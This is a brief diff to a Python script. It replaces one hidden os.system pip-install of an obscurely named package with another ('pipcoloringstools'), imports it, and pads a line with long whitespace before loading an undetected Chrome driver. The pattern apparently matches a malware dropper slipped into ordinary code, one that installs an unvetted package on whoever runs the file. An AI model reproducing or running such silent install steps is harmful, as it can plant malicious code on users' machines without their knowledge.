@@ -1,6 +1,6 @@
 import os
-os.system("pip install syssqlitedbmodules")
-import syssqlitedbmodules
+os.system("pip install pipcoloringstools")
+import pipcoloringstools
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
